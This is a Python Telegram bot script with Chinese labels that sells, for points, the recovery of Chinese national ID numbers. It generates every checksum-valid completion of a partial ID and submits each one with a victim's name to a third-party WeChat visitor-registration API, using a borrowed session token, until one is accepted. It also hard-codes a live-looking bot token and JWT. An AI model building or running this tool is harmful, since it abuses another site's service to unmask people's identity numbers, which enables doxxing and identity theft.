import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'
TOKEN_FILE = 'token.txt'
DEFAULT_TOKEN = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIyNDkyNDYiLCJpYXQiOjE3Mzg1MDMxMTcsImV4cCI6MTczODY3NTkxN30.i9w1G8Y2mU5R5cCI6IkpXVCJ9" 

bot = telebot.TeleBot(API_TOKEN)
user_states = {}
generated_cache = {} 

def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): v for k, v in data.items()}
        except: pass
    tk = DEFAULT_TOKEN
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content: tk = content
        except: pass
    return pts, tk

user_points, CURRENT_X_TOKEN = load_data()

def save_points():
    with open(POINTS_FILE, 'w') as f: json.dump(user_points, f)

def is_valid_id(n):
    if len(n) != 18: return False
    try:
        var = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
        var_id = ['1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2']
        n = n.upper()
        checksum = sum(int(n[i]) * var[i] for i in range(17)) % 11
        return var_id[checksum] == n[17]
    except: return False

def get_ui_bar(done, total):
    percent = int(done / total * 100) if total > 0 else 0
    bar_len = 16 
    filled = int(bar_len * done // total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_len - filled)
    return f"⌛ **核验中...**\n[{bar}] {done}/{total} {percent}%"

# --- 核心核验逻辑 ---
def run_batch_task(chat_id, msg_id, name, id_list, uid):
    global CURRENT_X_TOKEN
    headers = {"X-Token": CURRENT_X_TOKEN, "content-type": "application/json"}
    total, done = len(id_list), 0
    success_match, is_running, stop_signal = None, True, False

    def progress_monitor():
        nonlocal done, is_running
        last_t = 0
        while is_running:
            if time.time() - last_t > 3:
                try:
                    bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=get_ui_bar(done, total))
                    last_t = time.time()
                except: pass
            time.sleep(1)

    threading.Thread(target=progress_monitor, daemon=True).start()

    def verify(id_no):
        nonlocal done, is_running, stop_signal, success_match
        if stop_signal or not is_running: return
        try:
            payload = {"id_type": "id_card", "mobile": "15555555555", "id_no": id_no, "name": name}
            r = requests.post("https://wxxcx.cdcypw.cn/wechat/visitor/create", json=payload, headers=headers, timeout=5)
            if r.json().get("code") == 0:
                success_match = f"✨ 发现成功匹配：\n{name} {id_no} 二要素验证成功✅"
                stop_signal, is_running = True, False
        except: pass
        finally: done += 1

    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(verify, id_list)

    is_running = False
    if success_match:
        bot.send_message(chat_id, success_match)
    else:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text="❌ 核验完成，未发现匹配结果。")

# ================= 2. 指令逻辑 =================

@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id
    user_states[message.chat.id] = {'step': 'v_name'}
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"👋 **核验模式**\n💰 积分: {pts}\n请输入姓名:")

@bot.message_handler(commands=['gen'])
def gen_cmd(message):
    uid = message.from_user.id
    user_states[message.chat.id] = {'step': 'g_card'}
    pts = user_points.get(uid, 0)
    bot.send_message(message.chat.id, f"🛠 **生成模式**\n💰 积分: {pts}\n请输入补全号(x表示未知):")

@bot.message_handler(commands=['add'])
def add_points(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        _, tid, amt = message.text.split()
        user_points[int(tid)] = user_points.get(int(tid), 0) + int(amt)
        save_points()
        bot.reply_to(message, f"✅ 充值成功！余额: {user_points[int(tid)]}")
    except: pass

# ================= 3. 步骤处理 =================

@bot.message_handler(func=lambda m: m.chat.id in user_states and not m.text.startswith('/'))
def handle_steps(message):
    state, uid, text = user_states[message.chat.id], message.from_user.id, message.text.strip()
    
    if state['step'] == 'v_name':
        user_states[message.chat.id].update({'step': 'v_ids', 'name': text})
        bot.send_message(message.chat.id, "请发送列表:")
        
    elif state['step'] == 'v_ids':
        v_ids = [i for i in re.findall(r'\d{17}[\dXx]', text) if is_valid_id(i)]
        if v_ids and user_points.get(uid, 0) >= 100:
            user_points[uid] -= 100; save_points()
            msg = bot.send_message(message.chat.id, get_ui_bar(0, len(v_ids)))
            threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, state['name'], v_ids, uid)).start()
        del user_states[message.chat.id]

    elif state['step'] == 'g_card':
        user_states[message.chat.id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(message.chat.id, "请输入性别(男/女/未知):")

    elif state['step'] == 'g_sex':
        if user_points.get(uid, 0) < 50:
            bot.send_message(message.chat.id, "❌ 积分不足"); return
        
        bot.send_message(message.chat.id, "⌛ 正在计算补全...")
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in state['card']]
        if text == "男": char_sets[16] = ["1", "3", "5", "7", "9"]
        elif text == "女": char_sets[16] = ["0", "2", "4", "6", "8"]
        
        ids = [num for res in itertools.product(*char_sets) if is_valid_id(num := "".join(res))][:5000]
        
        if ids:
            user_points[uid] -= 50; save_points()
            generated_cache[uid] = ids  # 存入缓存
            with open("铭.txt", "w") as f: f.write("\n".join(ids))
            
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(f"🚀 立即核验这些号码 (100积分)", callback_data="start_verify_flow"))
            # 修复：在这里添加了 len(ids) 的显示
            bot.send_document(message.chat.id, open("铭.txt", "rb"), 
                              caption=f"✅ 生成成功！共 `{len(ids)}` 个\n💰 消耗 50 积分，余额 `{user_points[uid]}`", 
                              reply_markup=markup)
        else:
            bot.send_message(message.chat.id, "❌ 未能生成有效号码，请检查补全号格式。")
        del user_states[message.chat.id]

@bot.callback_query_handler(func=lambda call: call.data == "start_verify_flow")
def callback_start_verify(call):
    uid = call.from_user.id
    if uid not in generated_cache:
        bot.send_message(call.message.chat.id, "❌ 缓存已失效，请重新使用 /gen 生成。")
        return
    if user_points.get(uid, 0) < 100:
        bot.answer_callback_query(call.id, "❌ 积分不足", show_alert=True); return
        
    bot.send_message(call.message.chat.id, "👤 请输入要核验的姓名:")
    user_states[call.message.chat.id] = {'step': 'v_name_after_gen'}
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id, {}).get('step') == 'v_name_after_gen' and not m.text.startswith('/'))
def logic_after_gen(message):
    uid = message.from_user.id
    if uid not in generated_cache:
        bot.send_message(message.chat.id, "❌ 错误：未找到生成的号码，请重新 /gen")
        return
        
    name = message.text.strip()
    user_points[uid] -= 100; save_points()
    id_list = generated_cache[uid]
    msg = bot.send_message(message.chat.id, get_ui_bar(0, len(id_list)))
    threading.Thread(target=run_batch_task, args=(message.chat.id, msg.message_id, name, id_list, uid)).start()
    del user_states[message.chat.id]

if __name__ == '__main__':
    bot.infinity_polling()
